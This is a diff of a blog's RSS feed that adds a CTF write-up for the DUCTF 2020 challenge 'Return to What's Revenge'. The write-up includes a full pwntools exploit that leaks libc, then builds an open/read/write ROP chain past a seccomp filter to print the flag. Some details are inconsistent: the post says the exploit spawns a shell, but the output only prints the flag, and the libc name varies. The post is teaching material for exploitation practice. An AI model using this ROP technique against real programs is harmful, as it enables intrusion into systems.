@@ -1,4 +1,273 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Mon, 16 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Tue, 17 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>DUCTF 2020 :: Return to What's Revenge</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</link><pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</guid><description>Reverse Engineering Running file tells us that the target binary is a 64-bit dynamically linked linux executable.
+$ file ./return-to-whats-revenge ./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped We can run pwntools' checksec tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>Running <code>file</code> tells us that the target binary is a 64-bit dynamically linked linux executable.</p>
+<pre><code>$ file ./return-to-whats-revenge 
+./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
+</code></pre><p>We can run pwntools' <code>checksec</code> tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&rsquo;ll likely have to build a ROP chain to bypass it.</p>
+<pre><code>$ checksec ./return-to-whats-revenge 
+[*] './return-to-whats-revenge'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000) 
+</code></pre><p>Running the binary shows us that it simply prompts the user for input prior to exiting. It&rsquo;s likely we&rsquo;ll find a vulnerability of some sort where it takes user input.</p>
+<pre><code>$ ./return-to-whats-revenge 
+Today, we'll have a lesson in returns.
+Where would you like to return to?
+asdf
+</code></pre><p>Disassembling the executable shows us that it contains two important functions. The <code>main</code> function calls a function called <code>vuln</code>. The <code>vuln</code> function makes a <code>gets</code> call with a stack variable, so we&rsquo;ve found a stack buffer overflow.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s;
+    
+    puts(<span style="color:#e6db74">&#34;Where would you like to return to?&#34;</span>);
+    gets(<span style="color:#f92672">&amp;</span>s);
+    <span style="color:#66d9ef">return</span>;
+}
+
+undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+{
+    puts(<span style="color:#e6db74">&#34;Today, we</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">ll have a lesson in returns.&#34;</span>);
+    vuln();
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Running <code>strace</code> on the binary shows us that (at some point prior to taking user input) instantiates several <code>seccomp</code> rules, so not only will we have to build a ROP chain, we&rsquo;ll have to work within the <code>seccomp</code> jail.</p>
+<pre><code>$ strace ./return-to-whats-revenge
+
+...
+
+prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=25, filter=0x7fff935ea670}) = 0
+
+...
+</code></pre><p>We can use a wonderful tool called <code>seccomp-tools</code> to dump the <code>seccomp</code> rules that the binary operates under. Note that the binary allows the <code>open</code>, <code>read</code>, and <code>write</code> syscalls - so we should be able to build a ROP chain that opens, reads, and writes the flag to <code>stdout</code>.</p>
+<pre><code>$ seccomp-tools dump ./return-to-whats-revenge 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
+ 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
+ 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
+ 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
+ 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0024: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre><p>Let&rsquo;s use <code>readelf</code> to get the address of the binary&rsquo;s <code>.data</code> section, we&rsquo;ll want to use it to store our <code>flag.txt</code> string that we use in the <code>open</code> syscall of our ROP chain.</p>
+<pre><code>$ readelf --sections ./return-to-whats-revenge
+
+..
+
+   [22] .data             PROGBITS         0000000000404000  00003000
+       0000000000000010  0000000000000000  WA 
+
+...
+</code></pre><p>Earlier we noticed that the binary uses <code>puts</code>, we can use this to perform a simple <code>puts(puts)</code> style leak to obtain the an address in <code>libc</code>. Let&rsquo;s find the offset of <code>puts</code> from the base of <code>libc</code>. We&rsquo;ll want to use this later to find the base address of <code>libc</code>.</p>
+<pre><code>pwndbg&gt; info proc map
+process 1461
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+...
+      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+...
+pwndbg&gt; p puts
+$2 = {int (const char *)} 0x7ffff7e655f0 &lt;__GI__IO_puts&gt;
+pwndbg&gt; p/x 0x7ffff7e655f0-0x7ffff7def000
+$3 = 0x765f0
+</code></pre><p>Lastly, we just need to find a bunch of different ROP gadgets in order to perform our exploit. These are mostly just <code>pop reg; ret</code> instructions that we can use to move values into the registers we need to perform syscalls, and a <code>syscall</code> instruction that&rsquo;ll allow us to execute our <code>open</code>, <code>read</code>, and <code>write</code> syscalls.</p>
+<pre><code>$ ropper --file ./return-to-whats-revenge --search 'pop rdi'         
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: ./return-to-whats-revenge
+0x00000000004019db: pop rdi; ret;
+</code></pre><pre><code>$ ropper --file ./return-to-whats-revenge --search 'pop rsi'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rsi
+
+[INFO] File: ./return-to-whats-revenge
+0x00000000004019d9: pop rsi; pop r15; ret;
+</code></pre><pre><code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rdx'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdx
+
+[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
+...
+0x00000000000cb1cd: pop rdx; ret;
+</code></pre><pre><code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rax'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rax
+
+[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
+...
+0x000000000003ee88: pop rax; ret;
+...
+</code></pre><pre><code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'syscall'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: syscall
+
+[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
+...
+0x00000000000580da: syscall; ret;
+</code></pre><h2 id="information-gathering">Information Gathering</h2>
+<p>The only bit of information we now need to gather is the offset of the return address from our input buffer.</p>
+<p>Here&rsquo;s a quick script that&rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address from our input buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-whats-revenge&#39;</span>)
+gdb<span style="color:#f92672">.</span>attach(r)
+
+r<span style="color:#f92672">.</span>clean()
+r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">300</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.</p>
+<pre><code> ► 0x4011d9 &lt;vuln+39&gt;    ret    &lt;0x6161616161616168&gt;
+</code></pre><p>We can use pwntools' <code>cyclic_find</code> function to calculate the offset of the return address from the start of our input buffer (using the value stored in the return address we found above).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616168</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">56</span>
+</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
+<p>Now that we have everything we need, we can start to write our exploit. There&rsquo;s a lot of things we&rsquo;ll need to achieve (leaks, etc), so here&rsquo;s a brief summary of what we want to do:</p>
+<ul>
+<li>Overwrite the return address to gain control of process execution.</li>
+<li>Perform a <code>puts(puts)</code> leak to obtain an address in <code>libc</code>.</li>
+<li>Calculate the base address of <code>libc</code>.</li>
+<li>Return back to <code>main</code> so we can perform the second stage of our exploit.</li>
+<li>Build a ROP chain that opens, reads, and writes the contents of <code>flag.txt</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> time
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+
+
+pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span> 
+
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">return-to-whats-revenge
+</span><span style="color:#e6db74">0x00000000004019db: pop rdi; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4019db</span>
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">return-to-whats-revenge
+</span><span style="color:#e6db74">0x00000000004019d9: pop rsi; pop r15; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4019d9</span>
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">libc-3.1.so
+</span><span style="color:#e6db74">0x00000000000cb1cd: pop rdx; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0cb1cd</span>
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">libc-3.1.so
+</span><span style="color:#e6db74">0x000000000003ee88: pop rax; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x03ee88</span>
+
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">libc-3.1.so
+</span><span style="color:#e6db74">0x00000000000580da: syscall; ret;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0580da</span>
+
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./return-to-whats-revenge&#39;</span>)
+
+
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./return-to-whats-revenge&#39;</span>)
+
+
+rop <span style="color:#f92672">=</span> ROP(elf)
+
+rop<span style="color:#f92672">.</span>raw(pop_rdi)
+rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#75715e"># pop rdi ; got.puts</span>
+rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>])
+rop<span style="color:#f92672">.</span>raw(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+
+
+r<span style="color:#f92672">.</span>clean()
+r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())
+
+leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>readline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+leak <span style="color:#f92672">=</span> unpack(leak, len(leak) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+libc <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x765f0</span>
+
+
+rop <span style="color:#f92672">=</span> flat(
+    <span style="color:#75715e"># read(.data, stdin, 9)</span>
+    pop_rdi, <span style="color:#ae81ff">0</span>, pop_rsi, <span style="color:#ae81ff">0x404000</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">9</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>syscall,
+    
+    <span style="color:#75715e"># open(&#34;flag.txt&#34;, 0, 0)</span>
+    pop_rdi, <span style="color:#ae81ff">0x404000</span>, pop_rsi, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">2</span>, libc<span style="color:#f92672">+</span>syscall,
+    
+    <span style="color:#75715e"># read(3, .data+0x10, 35)</span>
+    pop_rdi, <span style="color:#ae81ff">3</span>, pop_rsi, <span style="color:#ae81ff">0x404010</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">35</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>syscall,
+
+    <span style="color:#75715e"># write(stdout, .data+0x10, 35)</span>
+    pop_rdi, <span style="color:#ae81ff">1</span>, pop_rsi, <span style="color:#ae81ff">0x404010</span>, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rdx, <span style="color:#ae81ff">35</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">1</span>, libc<span style="color:#f92672">+</span>syscall,
+
+    <span style="color:#75715e"># exit(0)</span>
+    pop_rdi, <span style="color:#ae81ff">0</span>, libc<span style="color:#f92672">+</span>pop_rax, <span style="color:#ae81ff">60</span>, libc<span style="color:#f92672">+</span>syscall
+)
+
+r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop)
+r<span style="color:#f92672">.</span>writeline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag.txt</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+
+r<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">&#39;Where would you like to return to?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+print(r<span style="color:#f92672">.</span>readall())
+r<span style="color:#f92672">.</span>close()
+</code></pre></div><p>And finally, here&rsquo;s our exploit in action. It spawns an interactive shell that we can use to retrieve the flag.</p>
+<pre><code>$ ./exploit.py 
+[+] Starting local process './return-to-whats-revenge': pid 2683
+[*] './return-to-whats-revenge'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded 14 cached gadgets for './return-to-whats-revenge'
+Today, we'll have a lesson in returns.
+Where would you like to return to?
+DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
+[*] Stopped process './return-to-whats-revenge' (pid 2683)
+</code></pre>]]></content></item><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
 $ file return-to-what return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped Running pwntools' checksec tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
 <p>We&rsquo;ll start by running <code>file</code> to get an idea of the executable&rsquo;s architecture and platform. Note that it is a 64-bit linux executable.</p>
 <pre><code>$ file return-to-what 
